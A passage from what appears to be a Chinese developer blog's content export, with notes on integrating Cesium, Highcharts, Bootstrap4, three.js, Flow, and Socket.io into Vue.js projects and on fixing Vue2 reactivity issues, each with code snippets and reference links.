<li><p>在build/webpack.base.conf.js文件中做如下修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;定义cesium源代码位置</span><br><span class="line">const cesiumSource &#x3D; &#39;..&#x2F;node_modules&#x2F;cesium&#x2F;Source&#39;</span><br><span class="line">...</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">...</span><br><span class="line">output: &#123;</span><br><span class="line">    path: config.build.assetsRoot,</span><br><span class="line">    filename: &#39;[name].js&#39;,</span><br><span class="line">    publicPath: process.env.NODE_ENV &#x3D;&#x3D;&#x3D; &#39;production&#39;</span><br><span class="line">      ? config.build.assetsPublicPath</span><br><span class="line">      : config.dev.assetsPublicPath,</span><br><span class="line">    &#x2F;&#x2F; Needed to compile multiline strings in Cesium</span><br><span class="line">    sourcePrefix: &#39;&#39;</span><br><span class="line">  &#125;,</span><br><span class="line">amd:&#123;</span><br><span class="line">    &#x2F;&#x2F; Enable webpack-friendly use of require in Cesium</span><br><span class="line">    toUrlUndefined: true</span><br><span class="line">  &#125;,</span><br><span class="line">resolve: &#123;</span><br><span class="line">    extensions: [&#39;.js&#39;, &#39;.vue&#39;, &#39;.json&#39;],</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#39;vue$&#39;: &#39;vue&#x2F;dist&#x2F;vue.esm.js&#39;,</span><br><span class="line">      &#39;@&#39;: resolve(&#39;src&#39;),</span><br><span class="line">      &#x2F;&#x2F;设置cesium的别名</span><br><span class="line">      &#39;cesium&#39;: path.resolve(__dirname, cesiumSource)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      ...</span><br><span class="line">    ],</span><br><span class="line">    &#x2F;&#x2F;不让Webpack打印载入特定库时候的警告</span><br><span class="line">    unknownContextCritical: false</span><br><span class="line">  &#125;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在build/webpack.dev.conf.js文件中做如下修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;定义 Cesium 源代码路径，前面没有..&#x2F;</span><br><span class="line">const cesiumSource &#x3D; &#39;node_modules&#x2F;cesium&#x2F;Source&#39;</span><br><span class="line">&#x2F;&#x2F;定义 Cesium Workers 路径</span><br><span class="line">const cesiumWorkers &#x3D; &#39;..&#x2F;Build&#x2F;Cesium&#x2F;Workers&#39;</span><br><span class="line">...</span><br><span class="line">plugins: [</span><br><span class="line">    ...</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &#39;Workers&#39; &#125; ]),</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Assets&#39;), to: &#39;Assets&#39; &#125; ]),</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Widgets&#39;), to: &#39;Widgets&#39; &#125; ]),</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      &#x2F;&#x2F; Define relative base path in cesium for loading assets</span><br><span class="line">      CESIUM_BASE_URL: JSON.stringify(&#39;&#39;)</span><br><span class="line">    &#125;)</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></li>
<li><p>在build/webpack.prod.conf.js文件中做如下修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;定义 Cesium 源代码路径，前面没有..&#x2F;</span><br><span class="line">const cesiumSource &#x3D; &#39;node_modules&#x2F;cesium&#x2F;Source&#39;</span><br><span class="line">&#x2F;&#x2F;定义 Cesium Workers 路径</span><br><span class="line">const cesiumWorkers &#x3D; &#39;..&#x2F;Build&#x2F;Cesium&#x2F;Workers&#39;</span><br><span class="line">...</span><br><span class="line">plugins: [</span><br><span class="line">    ...</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &#39;Workers&#39; &#125; ]),</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Assets&#39;), to: &#39;Assets&#39; &#125; ]),</span><br><span class="line">    new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Widgets&#39;), to: &#39;Widgets&#39; &#125; ]),</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      &#x2F;&#x2F;定义 Cesium 从哪里加载资源，如果使用默认的&#39;&#39;，却变成了绝对路径了，所以这里使用&#39;.&#x2F;&#39;,使用相对路径</span><br><span class="line">      CESIUM_BASE_URL: JSON.stringify(&#39;.&#x2F;&#39;)</span><br><span class="line">    &#125;)</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="Vue-js组件编写"><a href="#Vue-js组件编写" class="headerlink" title="Vue.js组件编写"></a>Vue.js组件编写</h2><ul>
<li>在src/components下新建 CesiumViewer.vue vue组件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;cesiumContainer&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">import Cesium from &#39;cesium&#x2F;Cesium&#39;</span><br><span class="line">import widgets from &#39;cesium&#x2F;Widgets&#x2F;widgets.css&#39;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;CesiumViewer&#39;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style  rel&#x3D;&quot;stylesheet&#x2F;scss&quot; lang&#x3D;&quot;scss&quot; scoped&gt;</span><br><span class="line">#cesiumContainer &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></li>
<li>创建全局样式文件src/styles/index.scss，做如下修改<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html,</span><br><span class="line">body &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>在src/main.js中做如下修改<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#39;@&#x2F;styles&#x2F;index.scss&#39; &#x2F;&#x2F; global css</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://www.jianshu.com/p/fb237c7eb48c" target="_blank" rel="noopener">基于webpack 构建Cesium + Vue 的应用</a>, by QingMings</li>
<li><a href="https://www.jianshu.com/p/0815c76d949f" target="_blank" rel="noopener">Vue-cli 3.0 + cesium 构建</a>,by QingMings.</li>
<li><a href="https://cesiumjs.org/tutorials/cesium-and-webpack/" target="_blank" rel="noopener">cesium-and-webpack</a>, by cesiumjs.org</li>
<li><a href="https://segmentfault.com/q/1010000012765665/a-1020000012832001" target="_blank" rel="noopener">vue-cli生成的项目，main.js引入scss时报错</a>,by segmentfault.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js集成Highcharts</title>
    <url>/2018/05/10/Vue-js%E9%9B%86%E6%88%90Highcharts/</url>
    <content><![CDATA[<h2 id="Vue-js集成Highcharts方法"><a href="#Vue-js集成Highcharts方法" class="headerlink" title="Vue.js集成Highcharts方法"></a>Vue.js集成Highcharts方法</h2><ol>
<li>安装highcharts<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save highcharts</span><br></pre></td></tr></table></figure></li>
<li>封装hightcharts成Vue.js组件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;highcharts-container&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Highcharts from &#39;highcharts&#x2F;highstock&#39;</span><br><span class="line">import HighchartsMore from &#39;highcharts&#x2F;highcharts-more&#39;</span><br><span class="line">import HighchartsDrilldown from &#39;highcharts&#x2F;modules&#x2F;drilldown&#39;</span><br><span class="line">import Highcharts3D from &#39;highcharts&#x2F;highcharts-3d&#39;</span><br><span class="line">HighchartsMore(Highcharts)</span><br><span class="line">HighchartsDrilldown(Highcharts)</span><br><span class="line">Highcharts3D(Highcharts)</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#39;options&#39;],</span><br><span class="line">  name: &#39;HighCharts&#39;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      chart: null</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    options: function (newVal, oldVal) &#123; &#x2F;&#x2F; watch it</span><br><span class="line">      this.chart.update(newVal, true)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    this.initChart()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    initChart () &#123;</span><br><span class="line">      this.chart &#x3D; new Highcharts.Chart(this.$el, this.options)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li>
<li>在src/main.js引入组件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import HighCharts from &#39;.&#x2F;components&#x2F;HighCharts.vue&#39;</span><br><span class="line">Vue.component(&#39;HighCharts&#39;, HighCharts)</span><br></pre></td></tr></table></figure></li>
<li>使用组件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;radarGraph&quot;&gt;</span><br><span class="line">    &lt;HighCharts :options&#x3D;&quot;options&quot; class&#x3D;&quot;radar&quot; &gt;&lt;&#x2F;HighCharts&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;RadarGraph&#39;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    gameInfo () &#123;</span><br><span class="line">      return this.$store.state.gameInfo</span><br><span class="line">    &#125;,</span><br><span class="line">    options () &#123;</span><br><span class="line">      return &#123;</span><br><span class="line"></span><br><span class="line">        chart: &#123;</span><br><span class="line">          polar: true,</span><br><span class="line">          type: &#39;line&#39;,</span><br><span class="line">          marginTop: 0,</span><br><span class="line">          marginBottom: 0,</span><br><span class="line">          marginLeft: 0,</span><br><span class="line">          marginRight: 0</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        credits: &#123;</span><br><span class="line">          enabled: false</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        pane: &#123;</span><br><span class="line">          size: &#39;75%&#39;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        title: null,</span><br><span class="line"></span><br><span class="line">        legend: &#123;</span><br><span class="line">          enabled: false</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        xAxis: &#123;</span><br><span class="line">          categories: [&#39;分类1&#39;, &#39;分类2&#39;, &#39;分类3&#39;, &#39;分类4&#39;,</span><br><span class="line">            &#39;分类5&#39;, &#39;分类6&#39;</span><br><span class="line">          ],</span><br><span class="line">          labels: &#123;</span><br><span class="line">            style: &#123;</span><br><span class="line">              fontSize: &#39;14px&#39;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          tickmarkPlacement: &#39;on&#39;,</span><br><span class="line">          lineWidth: 0</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        yAxis: &#123;</span><br><span class="line">          gridLineInterpolation: &#39;polygon&#39;,</span><br><span class="line">          lineWidth: 0,</span><br><span class="line">          min: 0</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        series: [&#123;</span><br><span class="line">          type: &#39;area&#39;,</span><br><span class="line">          name: &#39;得分&#39;,</span><br><span class="line">          data: [this.gameInfo.radar1, this.gameInfo.radar2, this.gameInfo.radar3, this.gameInfo.radar4, this.gameInfo.radar5, this.gameInfo.radar6],</span><br><span class="line">          pointPlacement: &#39;on&#39;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    ...mapGetters([</span><br><span class="line">      &#39;userId&#39;</span><br><span class="line">    ])</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    this.fetchData()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    fetchData () &#123;</span><br><span class="line">      this.$store.dispatch(&#39;GetGameInfo&#39;, this.userId)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
参考链接</li>
</ol>
<hr>
<ol>
<li><a href="https://blog.jianshukeji.com/highcharts/use-highcharts-with-vue.html" target="_blank" rel="noopener">在 Vue 中使用 Highcharts</a>,by 简数科技.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js集成Bootstrap4</title>
    <url>/2018/05/09/Vue-js%E9%9B%86%E6%88%90Bootstrap4/</url>
    <content><![CDATA[<p>记录在Vue.js中集成Bootstrap4的方法，防止忘了！</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
<li>vue-cli: 2.x</li>
</ul>
<h1 id="集成过程"><a href="#集成过程" class="headerlink" title="集成过程"></a>集成过程</h1><ol>
<li>创建Vue.js工程<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli</span><br><span class="line">vue init webpack project_name</span><br></pre></td></tr></table></figure></li>
<li>安裝 Sass-loader / node-sass<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install sass-loader node-sass --save-save</span><br></pre></td></tr></table></figure></li>
<li>安裝BootStrap / jQuery / Popper<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install bootstrap jquery popper.js --save</span><br></pre></td></tr></table></figure></li>
<li>配置build/webpack.base.conf.js<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; 新增plugins</span><br><span class="line">  plugins: [</span><br><span class="line">    new webpack.ProvidePlugin(&#123;</span><br><span class="line">        &#39;$&#39;: &quot;jquery&quot;,</span><br><span class="line">        &#39;jQuery&#39;: &quot;jquery&quot;,</span><br><span class="line">        &#39;Popper&#39;: &#39;popper.js&#39;</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>在src/main.js中载入Bootstrap<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#39;bootstrap&#39;</span><br><span class="line">import &#39;bootstrap&#x2F;dist&#x2F;css&#x2F;bootstrap.css&#39;</span><br></pre></td></tr></table></figure></li>
<li>使用Bootstrap和sass编写Vue.js组件</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://getbootstrap.com/docs/4.0/getting-started/webpack/" target="_blank" rel="noopener">Bootstrap Webpack</a>,by bootstrap homepage.</li>
<li><a href="https://code.luasoftware.com/tutorials/vuejs/setup-bootstrap-with-vue-cli-3-webpack/" target="_blank" rel="noopener">Setup Bootstrap 4 With Vue Cli 3 Webpack</a>,by lua software code.</li>
<li><a href="https://travishorn.com/adding-bootstrap-to-a-vue-cli-project-98c2a30e0ed0" target="_blank" rel="noopener">Adding Bootstrap to a Vue CLI Project</a>,by Travis Horn.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js集成three.js</title>
    <url>/2018/05/13/Vue-js%E9%9B%86%E6%88%90three-js/</url>
    <content><![CDATA[<p>Three.js是一个跨浏览器的脚本，使用JavaScript函数库或API来在网页浏览器中创建和展示动画的三维计算机图形。Three.js使用WebGL。源代码托管在GitHub。</p>
<p>下面介绍在Vue.js中集成three.js的步骤。</p>
<ol>
<li>安装vue-cli脚手架</li>
<li>安装three.js<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save three</span><br></pre></td></tr></table></figure></li>
<li>编写使用three.js创建3D场景的Vuejs组件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import * as Three from &#39;three&#39;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;Home&#39;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      camera: null,</span><br><span class="line">      scene: null,</span><br><span class="line">      renderer: null,</span><br><span class="line">      mesh: null</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    init: function () &#123;</span><br><span class="line">      var container &#x3D; document.getElementById(&#39;container&#39;)</span><br><span class="line"></span><br><span class="line">      this.camera &#x3D; new Three.PerspectiveCamera(70, container.clientWidth &#x2F; container.clientHeight, 0.01, 10)</span><br><span class="line">      this.camera.position.z &#x3D; 1</span><br><span class="line"></span><br><span class="line">      this.scene &#x3D; new Three.Scene()</span><br><span class="line"></span><br><span class="line">      var geometry &#x3D; new Three.BoxGeometry(0.2, 0.2, 0.2)</span><br><span class="line">      var material &#x3D; new Three.MeshNormalMaterial()</span><br><span class="line"></span><br><span class="line">      this.mesh &#x3D; new Three.Mesh(geometry, material)</span><br><span class="line">      this.scene.add(this.mesh)</span><br><span class="line"></span><br><span class="line">      this.renderer &#x3D; new Three.WebGLRenderer(&#123; antialias: true &#125;)</span><br><span class="line">      this.renderer.setSize(container.clientWidth, container.clientHeight)</span><br><span class="line">      container.appendChild(this.renderer.domElement)</span><br><span class="line">    &#125;,</span><br><span class="line">    animate: function () &#123;</span><br><span class="line">      requestAnimationFrame(this.animate)</span><br><span class="line">      this.mesh.rotation.x +&#x3D; 0.01</span><br><span class="line">      this.mesh.rotation.y +&#x3D; 0.02</span><br><span class="line">      this.renderer.render(this.scene, this.camera)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    this.init()</span><br><span class="line">    this.animate()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style  rel&#x3D;&quot;stylesheet&#x2F;scss&quot; lang&#x3D;&quot;scss&quot; scoped&gt;</span><br><span class="line">#container &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://zh.wikipedia.org/wiki/Three.js" target="_blank" rel="noopener">Three.js</a>, by Wikipedia</li>
<li><a href="https://stackoverflow.com/questions/47849626/import-and-use-three-js-library-in-vue-component" target="_blank" rel="noopener">Import and use three.js library in vue component</a>, by Stackoverlflow</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue2项目配置flow类型检查</title>
    <url>/2023/03/24/Vue2%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEflow%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%9F%A5/</url>
    <content><![CDATA[<p>Flow 是 JavaScript 代码的静态类型检查器。它做了很多工作来提高你的工作效率。使您编码更快、更智能、更自信，并且规模更大。</p>
<p>Flow 通过静态类型注解检查你的代码是否有错误。这些 类型允许您告诉 Flow 您希望您的代码如何工作，Flow 将确保它确实以这种方式工作。</p>
<p>Vue2的源代码就使用了Flow进行静态类型检查。下面介绍在Vue2项目中安装配置使用Flow的方法。</p>
<h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><ul>
<li>Babel是一个支持 Flow 的 JavaScript 代码编译器。Babel 将获取您的 Flow 代码并删除所有类型注释。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev @babel&#x2F;core @babel&#x2F;cli @babel&#x2F;preset-flow</span><br></pre></td></tr></table></figure>

<p>接下来，您需要在项目的根目录下创建一个文件，即.babelrc， 并将”@babel/preset-flow”配置在您的”presets”.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; &quot;presets&quot;: [&quot;@babel&#x2F;preset-flow&quot;] &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>flow可以直接通过npm或者yarn安装。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev flow-bin</span><br></pre></td></tr></table></figure>

<p>安装完成后在package.json中加入下面的脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;flow&quot;:&quot;flow check&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="配置flow"><a href="#配置flow" class="headerlink" title="配置flow"></a>配置flow</h2><p>首先生成flow配置文件.flowconfig：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\node_modules\.bin\flow init</span><br></pre></td></tr></table></figure>

<h2 id="使用flow"><a href="#使用flow" class="headerlink" title="使用flow"></a>使用flow</h2><p>新建一个文件index.js：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; @flow </span><br><span class="line">let a:number &#x3D; &#39;3&#39;;</span><br></pre></td></tr></table></figure>

<p>// @flow或者 /* @flow */告诉flow检查这个文件<br>输入npm run flow 执行类型检查</p>
<p><strong>注：在vue单文件组件使用flow需要额外配置</strong></p>
<p><strong>注：项目路径不能存在中文</strong></p>
<p>请参考<a href="https://segmentfault.com/a/1190000009162986" target="_blank" rel="noopener">vue2.0项目配置flow类型检查</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://segmentfault.com/a/1190000009162986" target="_blank" rel="noopener">vue2.0项目配置flow类型检查</a>,by ltinyho.</li>
<li><a href="https://juejin.cn/post/6844903487289950221" target="_blank" rel="noopener">Flow静态类型检查及在Vue项目中的使用</a>,by 美团点评点餐.</li>
<li><a href="https://flow.org/en/docs/config/" target="_blank" rel="noopener">.flowconfig</a>,by flow.org.</li>
<li><a href="https://zhenyong.github.io/flowtype/docs/advanced-configuration.html" target="_blank" rel="noopener">flow高级配置</a>,by zhenyong.</li>
<li><a href="https://segmentfault.com/a/1190000017778886" target="_blank" rel="noopener">flow从零开始—-安装和配置</a>,by advance100.</li>
<li><a href="https://blog.csdn.net/u013727805/article/details/80849329" target="_blank" rel="noopener">npm发布以@开头命名的public包！！！</a>,by ty41232X32.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js集成Socket.io</title>
    <url>/2018/05/09/Vue-js%E9%9B%86%E6%88%90Socket-io/</url>
    <content><![CDATA[<h2 id="Socket-IO简介"><a href="#Socket-IO简介" class="headerlink" title="Socket.IO简介"></a>Socket.IO简介</h2><blockquote>
<p>Socket.IO 是一个面向实时 web 应用的 JavaScript 库。它使得服务器和客户端之间实时双向的通信成为可能。他有两个部分：在浏览器中运行的客户端库，和一个面向Node.js的服务端库。两者有着几乎一样的API。像Node.js一样，它也是事件驱动的.</p>
</blockquote>
<blockquote>
<p>Socket.IO 主要使用WebSocket协议。但是如果需要的话，Socket.io可以回退到几种其它方法，例如Adobe Flash Sockets，JSONP拉取，或是传统的AJAX拉取，[2]并且在同时提供完全相同的接口。尽管它可以被用作WebSocket的包装库，它还是提供了许多其它功能，比如广播至多个套接字，存储与不同客户有关的数据，和异步IO操作。</p>
</blockquote>
<h2 id="Vue-js集成Socket-IO"><a href="#Vue-js集成Socket-IO" class="headerlink" title="Vue.js集成Socket.IO"></a>Vue.js集成Socket.IO</h2><ol>
<li>安装socket.io-client<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save socket.io-client</span><br></pre></td></tr></table></figure></li>
<li>在src/main.js中载入socket.io-client<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import io from &#39;socket.io-client&#39;</span><br><span class="line">const socket &#x3D; io(process.env.BASE_API)</span><br><span class="line">Object.defineProperty(Vue.prototype, &#39;$socket&#39;, &#123; value: socket &#125;)</span><br></pre></td></tr></table></figure></li>
<li>在Vuejs组件中使用socket.io-client<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.$socket.on(&#39;event&#39;,function(e)&#123;&#125;)</span><br></pre></td></tr></table></figure>
参考链接</li>
</ol>
<hr>
<ol>
<li><a href="https://zh.wikipedia.org/wiki/Socket.IO" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Socket.IO</a>, by Wikipedia</li>
<li><a href="https://socket.io/get-started/chat/" target="_blank" rel="noopener">https://socket.io/get-started/chat/</a>, by socket.io</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue2修改对象的属性值视图不更新解决方法</title>
    <url>/2022/09/09/Vuejs%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E5%80%BC%E8%A7%86%E5%9B%BE%E4%B8%8D%E6%9B%B4%E6%96%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在使用vuejs开发过程中，有时候出现修改对象属性后，视图并没有更新的问题。下面分析其产生原因并给出解决方法。</p>
<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>Vue2使用双向数据绑定，当你把一个普通的 JavaScript 对象传入 Vue2 实例作为 data 选项，Vue2 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。</p>
<p>这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 能够追踪依赖，在属性被访问和修改时通知变更。</p>
<p>每个组件实例都对应一个 watcher 实例，它会在组件渲染的过程中把“接触”过的数据属性记录为依赖。之后当依赖项的 setter 触发时，会通知 watcher，从而使它关联的组件重新渲染。</p>
<p>因此，vue2 无法检测 property 的添加或移除。由于 Vue2 会在初始化实例时对 property 执行 getter/setter转化，所以 property 必须在 data 对象上存在才能让 Vue 将它转换为响应式的。对于已经创建的实例，Vue允许动态添加根级别的响应式 property。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li>Vue.set()</li>
</ul>
<p>Vue.set(object,key,value)方法一次只能添加一个属性，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.$set(this.message,&#39;b&#39;,&quot;我手一杯 品尝你的美&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>Object.assign或_.extend()</li>
</ul>
<p>Object.assign或_.extend()可以往数据对象上添加多个属性，但是需要创建同时包含原属性、新属性的对象，从而有效触发watch()方法。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.message &#x3D; Object.assign(&#123;&#125;,this.message,&#123;b:&#39;我手一杯 品尝你的美&#39;,c:&#39;留下唇印的嘴&#39;&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/fe48f57ce8fd" target="_blank" rel="noopener">vue修改对象属性，视图不更新this.$set和Vue.nextTick([callback,context])</a>,by 青争小台.</li>
<li><a href="https://codeantenna.com/a/c9cqFErdGM" target="_blank" rel="noopener">vue响应式数据-修改对象的属性值，视图不更新</a>,by codeantenna.</li>
<li><a href="https://juejin.cn/post/7001999813344493581" target="_blank" rel="noopener">Vue3的响应式原理？一篇文章，八张图，三心为你解密~</a>,by Sunshine_Lin.</li>
